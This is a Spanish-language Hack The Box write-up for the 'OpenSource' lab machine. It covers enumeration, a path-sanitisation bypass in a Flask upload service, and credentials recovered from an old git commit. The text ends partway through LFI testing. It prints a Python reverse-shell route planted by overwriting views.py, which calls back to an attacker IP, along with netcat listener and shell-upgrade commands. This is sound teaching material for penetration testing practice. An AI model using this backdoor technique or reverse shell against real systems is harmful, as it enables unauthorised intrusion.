---
title: "OpenSource - Hack The Box"
date: 2024-10-08
draft: false
slug: "htb-writeup-opensource"
excerpt: "Esta fue una máquina que para nada es fácil; hubo que hacer bastante investigación. Empezamos enumerando la página web, aquí encontramos que podemos subir archivos y luego visitarlos, y también podemos descargar un archivo ZIP que contiene un repositorio de Git que es igual a la página web. Nos aprovechamos de tener los archivos de la página web para descubrir una vulnerabilidad en su sanitización de archivos, lo que nos permite suplantar cualquier archivo existente de la página web. Además, descubrimos unas credenciales de un usuario al enumerar el repositorio de Git, encontrándolas en una rama anterior. Sabiendo esto, suplantamos un script que nos crea una Reverse Shell/Backdoor con la que podemos obtener una shell cada vez que lo visitemos. Haciendo más pruebas a la sanitización, descubrimos que es posible aplicar LFI, que esto nos ayuda más adelante. Aplicando Fuzzing, descubrimos una consola de Flask que sirve para debuggear errores, siendo necesario un PIN para su acceso, copiamos el proceso que crea esos PIN usando un script de HackTricks con el cual nos genera un PIN estático que nos da acceso a la consola, esto lo logramos gracias al LFI descubierto, siendo otra forma con la que podemos obtener una shell. Dentro del contenedor de docker, descubrimos un puerto que al aplicar pivoting con chisel, encontramos que es el software Gitea, aquí probamos las credenciales que encontramos en el repositorio de Git y ganamos acceso, encontrando aquí un Backup que guarda las llaves del servicio SSH, así ganamos acceso a este servicio. Al final, usamos pspy para descubrir tareas CRON en uso, encontrando una que está relacionada con un repositorio Git del usuario actual, investigamos este repositorio y descubrimos que ocupa Hooks para su funcionamiento, aprovechándonos de esto, creamos un Hook que cambia los permisos de la Bash y nos permite escalar privilegios para ser el usuario Root."
categories: ["HackTheBox", "Easy Machine"]
tags: ["Linux", "Werkzeug", "Flask", "Gitea", "Git", "Web Enumeration", "Information Leakage", "Git Enumeration", "BurpSuite", "Abusing File Upload (AFU)", "Local File Inclusion (LFI)", "Shell Via Flask Debug (Werkzeug Debbuger - Unintended Way)", "Remote Port Forwarding", "Pivoting", "Abusing CRON Jobs", "Git Hooks", "Privesc - Abusing CRON Jobs", "Privesc - Malicious Git Hook", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "wappalizer"
  - "whatweb"
  - "echo"
  - "7z"
  - "gunzip"
  - "python3"
  - "BurpSuite"
  - "wfuzz"
  - "gobuster"
  - "git"
  - "ssh"
  - "nc"
  - "curl"
  - "python"
  - "chmod"
  - "chisel"
  - "lsof"
  - "sudo"
  - "id"
  - "uname"
  - "wget"
  - "pspy64"
  - "bash"
links:
  - "https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug#werkzeug-console-pin-exploit"
  - "https://github.com/pallets/werkzeug/blob/main/src/werkzeug/debug/__init__.py"
  - "https://linuxhandbook.com/scan-ports-netcat/"
  - "https://github.com/jpillora/chisel/releases"
  - "https://es.wikipedia.org/wiki/Gitea"
  - "https://github.com/DominicBreuker/pspy"
  - "https://www.atlassian.com/es/git/tutorials/git-hooks"
  - "https://gtfobins.github.io/gtfobins/git/"
showtoc: true
header:
  teaser: "/assets/images/htb-writeup-opensource/OpenSource.png"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 10.10.11.164
PING 10.10.11.164 (10.10.11.164) 56(84) bytes of data.
64 bytes from 10.10.11.164: icmp_seq=1 ttl=63 time=102 ms
64 bytes from 10.10.11.164: icmp_seq=2 ttl=63 time=88.7 ms
64 bytes from 10.10.11.164: icmp_seq=3 ttl=63 time=77.0 ms
64 bytes from 10.10.11.164: icmp_seq=4 ttl=63 time=88.9 ms

--- 10.10.11.164 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3008ms
rtt min/avg/max/mdev = 76.989/89.215/102.273/8.949 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.164 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-07 12:35 CST
Initiating SYN Stealth Scan at 12:35
Scanning 10.10.11.164 [65535 ports]
Discovered open port 22/tcp on 10.10.11.164
Discovered open port 80/tcp on 10.10.11.164
Completed SYN Stealth Scan at 12:35, 24.70s elapsed (65535 total ports)
Nmap scan report for 10.10.11.164
Host is up, received user-set (0.30s latency).
Scanned at 2024-10-07 12:35:32 CST for 25s
Not shown: 36309 filtered tcp ports (no-response), 29224 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 62

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 24.94 seconds
           Raw packets sent: 120462 (5.300MB) | Rcvd: 29925 (1.197MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Solamente vemos 2 puertos abierto. Veamos que información podemos obtener de estos dos.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 22,80 10.10.11.164 -oN targeted
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-07 12:36 CST
Nmap scan report for 10.10.11.164
Host is up (0.11s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)

| ssh-hostkey: 
|   2048 1e:59:05:7c:a9:58:c9:23:90:0f:75:23:82:3d:05:5f (RSA)
|   256 48:a8:53:e7:e0:08:aa:1d:96:86:52:bb:88:56:a0:b7 (ECDSA)
|_  256 02:1f:97:9e:3c:8e:7a:1c:7c:af:9d:5a:25:4b:b8:c8 (ED25519)
80/tcp open  http    Werkzeug/2.1.2 Python/3.10.3

|_http-title: upcloud - Upload files for Free!
|_http-server-header: Werkzeug/2.1.2 Python/3.10.3
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.10.3
|     Date: Mon, 07 Oct 2024 18:36:36 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 5316
|     Connection: close
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>upcloud - Upload files for Free!</title>
|     <script src="/static/vendor/jquery/jquery-3.4.1.min.js"></script>
|     <script src="/static/vendor/popper/popper.min.js"></script>
|     <script src="/static/vendor/bootstrap/js/bootstrap.min.js"></script>
|     <script src="/static/js/ie10-viewport-bug-workaround.js"></script>
|     <link rel="stylesheet" href="/static/vendor/bootstrap/css/bootstrap.css"/>
|     <link rel="stylesheet" href=" /static/vendor/bootstrap/css/bootstrap-grid.css"/>
|     <link rel="stylesheet" href=" /static/vendor/bootstrap/css/bootstrap-reboot.css"/>
|     <link rel=
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.10.3
|     Date: Mon, 07 Oct 2024 18:36:36 GMT
|     Content-Type: text/html; charset=utf-8
|     Allow: OPTIONS, GET, HEAD
|     Content-Length: 0
|     Connection: close
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.94SVN%I=7%D=10/7%Time=67042A2D%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,1573,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.1\.2\x
SF:20Python/3\.10\.3\r\nDate:\x20Mon,\x2007\x20Oct\x202024\x2018:36:36\x20
SF:GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\
SF:x205316\r\nConnection:\x20close\r\n\r\n<html\x20lang=\"en\">\n<head>\n\
SF:x20\x20\x20\x20<meta\x20charset=\"UTF-8\">\n\x20\x20\x20\x20<meta\x20na
SF:me=\"viewport\"\x20content=\"width=device-width,\x20initial-scale=1\.0\
SF:">\n\x20\x20\x20\x20<title>upcloud\x20-\x20Upload\x20files\x20for\x20Fr
SF:ee!</title>\n\n\x20\x20\x20\x20<script\x20src=\"/static/vendor/jquery/j
SF:query-3\.4\.1\.min\.js\"></script>\n\x20\x20\x20\x20<script\x20src=\"/s
SF:tatic/vendor/popper/popper\.min\.js\"></script>\n\n\x20\x20\x20\x20<scr
SF:ipt\x20src=\"/static/vendor/bootstrap/js/bootstrap\.min\.js\"></script>
SF:\n\x20\x20\x20\x20<script\x20src=\"/static/js/ie10-viewport-bug-workaro
SF:und\.js\"></script>\n\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20h
SF:ref=\"/static/vendor/bootstrap/css/bootstrap\.css\"/>\n\x20\x20\x20\x20
SF:<link\x20rel=\"stylesheet\"\x20href=\"\x20/static/vendor/bootstrap/css/
SF:bootstrap-grid\.css\"/>\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x2
SF:0href=\"\x20/static/vendor/bootstrap/css/bootstrap-reboot\.css\"/>\n\n\
SF:x20\x20\x20\x20<link\x20rel=")%r(HTTPOptions,C7,"HTTP/1\.1\x20200\x20OK
SF:\r\nServer:\x20Werkzeug/2\.1\.2\x20Python/3\.10\.3\r\nDate:\x20Mon,\x20
SF:07\x20Oct\x202024\x2018:36:36\x20GMT\r\nContent-Type:\x20text/html;\x20
SF:charset=utf-8\r\nAllow:\x20OPTIONS,\x20GET,\x20HEAD\r\nContent-Length:\
SF:x200\r\nConnection:\x20close\r\n\r\n")%r(RTSPRequest,1F4,"<!DOCTYPE\x20
SF:HTML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x204\.01//EN\"\n\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\"http://www\.w3\.org/TR/html4/strict\.dtd\">\n<html>\
SF:n\x20\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20http-
SF:equiv=\"Content-Type\"\x20content=\"text/html;charset=utf-8\">\n\x20\x2
SF:0\x20\x20\x20\x20\x20\x20<title>Error\x20response</title>\n\x20\x20\x20
SF:\x20</head>\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h
SF:1>Error\x20response</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20c
SF:ode:\x20400</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20
SF:request\x20version\x20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x
SF:20\x20<p>Error\x20code\x20explanation:\x20HTTPStatus\.BAD_REQUEST\x20-\
SF:x20Bad\x20request\x20syntax\x20or\x20unsupported\x20method\.</p>\n\x20\
SF:x20\x20\x20</body>\n</html>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 97.60 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Parece que el **servicio SSH** no acepta un login con credenciales. Podríamos comprobarlo, pero no tenemos credenciales por ahora, por lo que todo apunta a que debemos comenzar por el **puerto 80**.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Entremos:

<p align="center">
<img src="/assets/images/htb-writeup-opensource/Captura1.png">
</p>

Al parecer, esto es un servicio para subir y compartir archivos. 

Veamos que nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/htb-writeup-opensource/Captura2.png">
</p>

Está utilizando **Flask y Python**, esto puede ser útil más adelante.

Veamos si **whatweb** nos da algo de información extra:
```bash
whatweb http://10.10.11.164
http://10.10.11.164 [200 OK] Bootstrap, Country[RESERVED][ZZ], HTTPServer[Werkzeug/2.1.2 Python/3.10.3], IP[10.10.11.164], JQuery[3.4.1], Python[3.10.3], Script, Title[upcloud - Upload files for Free!], Werkzeug[2.1.2]
```
Se ven algunas cosas extras que también reportó el escaneo con **nmap**, pero nada nuevo.

Hay varios botones que no llevan a nada, a excepción de dos:

<p align="center">
<img src="/assets/images/htb-writeup-opensource/Captura3.png">
</p>

El primero nos descarga un **archivo ZIP** que analizaremos después y el segundo nos lleva a otra página en la que podemos subir archivos:

<p align="center">
<img src="/assets/images/htb-writeup-opensource/Captura4.png">
</p>

Probemos a subir un archivo random para ver qué pasa:
```bash
echo "Esto es una prueba" > test.txt
```

<p align="center">
<img src="/assets/images/htb-writeup-opensource/Captura5.png">
</p>

Nos genera un link que podemos visitar:

<p align="center">
<img src="/assets/images/htb-writeup-opensource/Captura6.png">
</p>

Parece que nos está interpretando lo que estamos subiendo. 

Podríamos probar si nos acepta **archivos PHP** aunque lo dudo bastante, pero lo que sí podemos probar, es subir un archivo de **Python** para ver si lo interpreta.

Vamos a crear uno simple:

<p align="center">
<img src="/assets/images/htb-writeup-opensource/Captura30.png">
</p>

Y carguémoslo:

<p align="center">
<img src="/assets/images/htb-writeup-opensource/Captura7.png">
</p>

Parece que no interpreto el archivo como **Python**, sino que lo descargo.

Cambiémoslo a un archivo de texto y probemos de nuevo:

<p align="center">
<img src="/assets/images/htb-writeup-opensource/Captura8.png">
</p>

Nada, de momento, no es por aquí la movida.

### Analizando Contenido de Archivo ZIP {#zip}

Veamos el contenido del **archivo ZIP**:
```bash
7z l source.zip

7-Zip 24.08 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-08-11

Scanning the drive for archives:
1 file, 2489147 bytes (2431 KiB)

Listing archive: source.zip

--
Path = source.zip
Type = zip
Physical Size = 2489147

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2022-04-28 05:45:52 D....            0            0  app
2022-04-28 06:50:20 D....            0            0  app/app
2022-04-28 06:50:20 .....          707          310  app/app/views.py
2022-04-28 05:34:45 .....          262          160  app/app/__init__.py
2022-04-28 05:39:31 D....            0            0  app/app/static
2022-04-28 05:34:45 D....            0            0  app/app/static/js
...
...
...
2022-04-28 05:45:17 .....          189          138  .git/hooks/post-update.sample
2022-04-28 05:45:17 .....         3610         1141  .git/hooks/update.sample
2022-04-28 05:45:17 .....         3079         1463  .git/hooks/fsmonitor-watchman.sample
2022-04-28 06:50:20 .....         5746         2509  .git/index
2022-04-28 05:45:17 D....            0            0  .git/logs
2022-04-28 06:50:20 .....         1741          405  .git/logs/HEAD
2022-04-28 05:45:17 D....            0            0  .git/logs/refs
2022-04-28 05:45:52 D....            0            0  .git/logs/refs/heads
2022-04-28 05:55:55 .....          497          204  .git/logs/refs/heads/public
2022-04-28 05:47:24 .....          581          233  .git/logs/refs/heads/dev
------------------- ----- ------------ ------------  ------------------------
2022-04-28 06:50:20            6204731      2440275  152 files, 96 folders
```

Podemos ver archivos de **Git**, entonces, acabamos de descargar un repositorio comprimido.

Descomprímelo para analizar su contenido:
```bash
unzip source.zip
Archive:  source.zip
   creating: app/
   creating: app/app/
  inflating: app/app/views.py        
  inflating: app/app/__init__.py     
   creating: app/app/static/
   creating: app/app/static/js/
...
...
...
```

Son bastantes archivos que vamos a ver que son:
```bash
ls
app  build-docker.sh  config  Dockerfile  source.zip
```

Veamos el contenido del **Dockerfile**:
```bash
cat Dockerfile

FROM python:3-alpine

# Install packages
RUN apk add --update --no-cache supervisor

# Upgrade pip
RUN python -m pip install --upgrade pip

# Install dependencies
RUN pip install Flask

# Setup app
RUN mkdir -p /app

# Switch working environment
WORKDIR /app

# Add application
COPY app .

# Setup supervisor
COPY config/supervisord.conf /etc/supervisord.conf

# Expose port the server is reachable on
EXPOSE 80

# Disable pycache
ENV PYTHONDONTWRITEBYTECODE=1

# Set mode
ENV MODE="PRODUCTION"

# Run supervisord
CMD ["/usr/bin/supervisord", "-c", "/etc/supervisord.conf"]
```
Parece que al ejecutar este archivo, nos crea un **contenedor de docker** que tendrá varias configuraciones activas. 

Analizándolo un poco a fondo, entendemos que se usa una versión minimalista de **Linux** llamada **3-alpine** que se instala con **Python** (o eso creo yo), actualizar **PIP**, instalar **Flask**, crear directorios, copiar un archivo para configurar un **supervisor**, exponer el **puerto 80**, desactiva el **pycache**, entra en **modo producción** y ejecuta el **supervisor**.

El archivo **build-docker.sh** no tiene información útil.

Entremos al **directorio config** y analicemos el archivo que está ahí:
```bash
cat supervisord.conf

[supervisord]
user=root
nodaemon=true
logfile=/dev/null
logfile_maxbytes=0
pidfile=/run/supervisord.pid

[program:flask]
command=python /app/run.py
stdout_logfile=/dev/stdout
stdout_logfile_maxbytes=0
stderr_logfile=/dev/stderr
stderr_logfile_maxbytes=0
```
Bien, este archivo me da a entender que el **usuario root** es el dueño y quien supervisa todo el contenedor. Además, se ve que está ejecutando un archivo llamado **run.py** en **Flask**.

Vamos a verlo, se encuentra dentro del **directorio /app**:
```python
import os

from app import app

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 80))
    app.run(host='0.0.0.0', port=port)
```
No podemos sacar mucho de aquí y tampoco hay más que podamos ver en este directorio.

Entremos al otro **directorio /app** y veamos qué hay ahí:
```bash
ls
__init__.py  configuration.py  static  templates  utils.py  views.py

pwd
/content/app/app
```
Aquí hay más archivos **Python**.

Pero los que se me hacen interesantes son el archivo **utils.py y views.py**.

Veamos primero el archivo **utils.py**:
```python
import time

def current_milli_time():
    return round(time.time() * 1000)

"""
Pass filename and return a secure version, which can then safely be stored on a regular file system.
"""

def get_file_name(unsafe_filename):
    return recursive_replace(unsafe_filename, "../", "")

"""
TODO: get unique filename
"""

def get_unique_upload_name(unsafe_filename):
    spl = unsafe_filename.rsplit("\\.", 1)
    file_name = spl[0]
    file_extension = spl[1]
    return recursive_replace(file_name, "../", "") + "_" + str(current_milli_time()) + "." + file_extension

"""
Recursively replace a pattern in a string
"""

def recursive_replace(search, replace_me, with_me):
    if replace_me not in search:
        return search
    return recursive_replace(search.replace(replace_me, with_me), replace_me, with_me)
```
Parece que este script se asegura de que el archivo subido no tenga un nombre que permita la lectura de archivos locales del servidor, es decir, sanitiza los archivos subidos, pues se asegura de que el nombre del archivo subido no tenga `../`.

Ahora veamos el archivo **views.py**:
```python
import os

from app.utils import get_file_name
from flask import render_template, request, send_file

from app import app

@app.route('/', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        f = request.files['file']
        file_name = get_file_name(f.filename)
        file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
        f.save(file_path)
        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
    return render_template('upload.html')

@app.route('/uploads/<path:path>')
def send_report(path):
    path = get_file_name(path)
    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))
```
Este script se encarga de implementar la parte de la carga de archivos, esto a partir de la función `def upload_file`. Cuando se envía un archivo (**POST**), sanitiza el nombre del archivo utilizando la función `get_file_name` del script **utils.py** y lo guarda en la ruta `/public/uploads` más el nombre del archivo sanitizado. Por último, renderiza una plantilla de **HTML** en donde mostrará la **URL** del host más el **directorio uploads** más el nombre del archivo, ejemplo: `http://10.10.11.164/uploads/test.txt`.

En la segunda función, se encarga de obtener el **path del archivo subido** y lo sanitiza con la función `get_file_name` del script **utils.py**, después envía el archivo a la ruta `/public/upload` más el **path del archivo**.

Esta última función es curiosa.

Probemos su funcionamiento en una sesión de **Python**, cargale la **librería os** para que funcione:
```python
python3
Python 3.12.6 (main, Sep  7 2024, 14:20:15) [GCC 14.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import os
```

Ahora pasemos la función `os.path.join` y al último argumento, pongamos un nombre random:
```python
>>> os.path.join(os.getcwd(), "public", "uploads", "test")
'/exploits/public/uploads/test'
```

Por último, cambiemos el nombre random por uno de un directorio para simular un path:
```python
>>> os.path.join(os.getcwd(), "public", "uploads", "/test")
'/test'
```

Entiendo que, cuando realiza este proceso, evita que podamos aplicar un **ataque LFI o un Directory Trasversal**.

Vamos a probar la sanitización que se está haciendo para ver si la podemos romper.

### Prueba de Concepto de Sanitización con BurpSuite {#PoC}

Abre **BurpSuite** y captura una subida de un archivo:

<p align="center">
<img src="/assets/images/htb-writeup-opensource/Captura9.png">
</p>

Envíala al **Repeater**, borra el nombre del archivo y envía la petición:

<p align="center">
<img src="/assets/images/htb-writeup-opensource/Captura10.png">
</p>

Observa que nos suelta información que no debería, siendo esto un **information leakage** y nos da la oportunidad de probar la sanitización que hemos visto que ocurre.

Agrega solamente puntos en el nombre del archivo y ve que aparecen en el **path** que no deberíamos ver:

<p align="center">
<img src="/assets/images/htb-writeup-opensource/Captura11.png">
</p>

Ahora, qué pasa si ponemos una diagonal solamente:

<p align="center">
<img src="/assets/images/htb-writeup-opensource/Captura12.png">
</p>

Ya no aparece el **path** de antes, solamente la pura diagonal.

Por último, probemos lo que pasa si cambiamos el nombre del archivo a `../`:

<p align="center">
<img src="/assets/images/htb-writeup-opensource/Captura13.png">
</p>

Parece que lo elimina, pero nos vuelve a mostrar el **path**.

Acabamos de comprobar que la sanitización sí funciona, pero no es del todo segura, pues si seguimos jugando con puntos y diagonales, encontraremos que sí acepta archivos con doble diagonal.

Pruébalo:

<p align="center">
<img src="/assets/images/htb-writeup-opensource/Captura14.png">
</p>

Esto quiere decir que es posible agregar un archivo a una ruta que queramos, por ejemplo, una **ruta del path** actual de la página web para suplantar un archivo.

Pero antes de probar esto, veamos si no hay algo que nos falte revisar aplicando **Fuzzing**.

### Fuzzing {#Fuzz}

```bash
wfuzz -c --hc=404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.11.164/FUZZ
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.164/FUZZ
Total requests: 220545

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                
=====================================================================

000000003:   200        9802 L   92977 W    2359649 C   "download"                                          
000003630:   200        45 L     144 W      1563 Ch     "console"                                             
000045226:   200        130 L    420 W      5313 Ch     "http://10.10.11.164/"                               
Total time: 0
Processed Requests: 220545
Filtered Requests: 220542
Requests/sec.: 0
```

| Parámetros | Descripción |
|---|---|
| *-c*       | Para ver el resultado en un formato colorido. |
| *--hc*     | Para no mostrar un código de estado en los resultados. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |

Ahora probemos con **gobuster**:
```bash
gobuster dir -u http://10.10.11.164/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.164/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/download             (Status: 200) [Size: 2489147]
/console              (Status: 200) [Size: 1563]
Progress: 220545 / 220546 (100.00%)
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |

Revisemos esa página que encontró llamada **/console**:

<p align="center">
<img src="/assets/images/htb-writeup-opensource/Captura15.png">
</p>

Parece que podemos entrar a una consola interactiva en la web, pero necesitamos un PIN válido para poder entrar.

Con esto, ya tenemos 2 formas en las que podemos tratar de ganar acceso a la máquina y vamos a aplicar ambas.

### Enumeración de Git {#git}

Algo que casi se nos olvida, es enumerar el **repositorio de Git** en cuanto a **logs, etiquetas, ramas, etc**.

Veamos primero que ramas existen:
```bash
git branch -a
  dev
* public
```

Tenemos 2 ramas y algo me dice que en la rama **dev**, vamos a encontrar algo.

Cambiemos a esa rama y veamos los logs:
```bash
git log
commit c41fedef2ec6df98735c11b2faf1e79ef492a0f3 (HEAD -> dev)
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:47:24 2022 +0200

    ease testing

commit be4da71987bbbc8fae7c961fb2de01ebd0be1997
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:46:54 2022 +0200

    added gitignore

commit a76f8f75f7a4a12b706b0cf9c983796fa1985820
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:46:16 2022 +0200

    updated

commit ee9d9f1ef9156c787d53074493e39ae364cd1e05
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:45:17 2022 +0200

    initial
```

Hay varios, te diría que revises todos (que es lo esencial), pero aquí están los **commits** más importantes:
* *a76f8f75f7a4a12b706b0cf9c983796fa1985820*
* *be4da71987bbbc8fae7c961fb2de01ebd0be1997*

Si los revisamos, encontraremos lo que parece ser un usuario y contraseña:
```bash
git show a76f8f75f7a4a12b706b0cf9c983796fa1985820
commit a76f8f75f7a4a12b706b0cf9c983796fa1985820
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:46:16 2022 +0200

    updated

diff --git a/app/.vscode/settings.json b/app/.vscode/settings.json
new file mode 100644
index 0000000..5975e3f
--- /dev/null
+++ b/app/.vscode/settings.json
@@ -0,0 +1,5 @@
+{
+  "python.pythonPath": "/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python",
+  "http.proxy": "http://dev01:Soulless_Developer#2022@10.10.10.128:5187/",
+  "http.proxyStrictSSL": false
+}
...
...
```

Probemos si de pura casualidad sirven en el **servicio SSH**:
```bash
ssh dev01@10.10.11.164
dev01@10.10.11.164: Permission denied (publickey).
```
Pues no funcionó y era lo que mencionaba antes, de que no está aceptando credenciales, sino llaves.

Guardemos esas credenciales para más tarde.

## Explotación de Vulnerabilidades {#Explotacion}

### Suplantando Script views.py de la Página Web para Generar una Backdoor {#suplantacion}

La idea es reemplazar un archivo que permita que ganemos acceso a la máquina, siendo nuestra mejor opción el script `views.py`.

Esto porque ya vimos que se encarga de guardar los archivos en una ruta que el usuario puede visitar.

Abre el script y agrega la siguiente función:
```python
@app.route('/shell')
def rev_shell():
        import socket
        import subprocess
        import os
        import pty

        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(("Tu_IP",443))
        os.dup2(s.fileno(),0)
        os.dup2(s.fileno(),1)
        os.dup2(s.fileno(),2)
        pty.spawn("sh")
```
Esta función va a crear la ruta **/shell**, que cuando visitemos, nos va a mandar una **shell** hacia una **netcat** que tengamos activa, convirtiéndola en una **Reverse Shell/Backdoor**.

Ahora, debemos suplantar este script y ya probamos que esto es posible.

Sube el script y captúralo con **BurpSuite**:

<p align="center">
<img src="/assets/images/htb-writeup-opensource/Captura16.png">
</p>

Una vez que captures la subida, en el campo de **filename**, pongamos la ruta del archivo que queremos suplantar, que sería `/app/app/views.py`:

<p align="center">
<img src="/assets/images/htb-writeup-opensource/Captura17.png">
</p>

Dale a **Forward** para enviar la petición y suplantar el script **views.py**:

<p align="center">
<img src="/assets/images/htb-writeup-opensource/Captura18.png">
</p>

Al parecer funcionó.

Vamos a comprobarlo:
* Abre una **netcat**:
```bash
nc -nlvp 443
listening on [any] 443 ...
```

* Visita la ruta: `http://10.10.11.164/shell` o aplica un **curl** a esa misma URL:
```bash
curl http://10.10.11.164/shell
```

* Observa la **netcat**:
```bash
nc -nlvp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [10.10.11.164] 43260
/app # whoami  
whoami
root
```

* Listo, ya solo has un tratamiento de la **TTY**:

```bash
/app # python3 -c 'import pty;pty.spawn("sh")'
python3 -c 'import pty;pty.spawn("sh")'
/app # ^Z      
zsh: suspended  nc -nlvp 443
                                                                                                                                                                                                                 
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
/app #
/app # export TERM=xterm
/app # export SHELL=/bin/sh
/app # 
```

Hemos ganado acceso, pero al contenedor solamente.

### Aplicando Local File Inclusion {#LFI}

Cuando descubrimos que se podía suplantar archivos únicamente agregando una diagonal al nombre del archivo, no probamos si podíamos aplicar **LFI**.

Desde una petición **POST** no podremos. Vamos a probarlo desde una petición **GET**.

Captura la petición de un archivo que hayas subido; en mi caso, capturaré el **archivo test.txt** que ya había subido:

<p align="center">
<img src="/assets/images/htb-writeup-opensource/Captura19.png">
</p>

Bien, como este archivo existe, vamos a probar qué pasa si apuntamos al **/etc/passwd**:

<p align="center">
<img src="/assets/images/htb-writeup-opensource/Captura20.png">
</p>

Nos está redireccionando.

